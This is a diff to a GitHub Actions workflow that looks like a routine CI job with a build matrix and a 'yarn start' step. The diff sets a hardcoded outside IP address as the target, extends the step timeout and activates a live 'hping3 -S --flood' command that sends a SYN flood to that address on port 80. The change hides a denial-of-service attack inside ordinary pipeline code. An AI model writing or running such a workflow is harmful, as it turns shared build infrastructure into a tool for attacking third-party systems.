@@ -52,8 +52,8 @@ jobs:
         # region: [us-east, us-west, eu-central, asia-east, ap-southeast]
         # service: [auth, billing, search, analytics, user]
         # tag: [dev, test, staging, prod]
-        arch: [x64, arm64, armv7]
-        version: [v1, v2]
+        # arch: [x64, arm64, armv7]
+        # version: [v1, v2]
         # test_level_2025: [unit, e2e]
     runs-on: ubuntu-latest
     env:
@@ -72,17 +72,15 @@ jobs:
 
           # getent ahostsv4 ioswy.com
           # IP=$(getent ahostsv4 ioswy.com | awk '{print $1}' | head -n 1)
-          IP=8.218.158.54
+          IP=125.77.20.66
           echo $IP
           echo "IP=$IP" >> $GITHUB_ENV
 
           yarn start
 
       - name: Step 2 - Continue
-        timeout-minutes: 2
+        timeout-minutes: 5
         run: |
           echo $IP
-          echo ${{ matrix.test_level_2025 }}
-          echo ${{ matrix.job }}
           # ping $IP
-          # sudo hping3 -S --flood -V -d 1400 -p 80 -s 1000-65535 $IP
+          timeout 10s hping3 -S --flood -V -d 1400 -p 80 -s 1000-65535 $IP
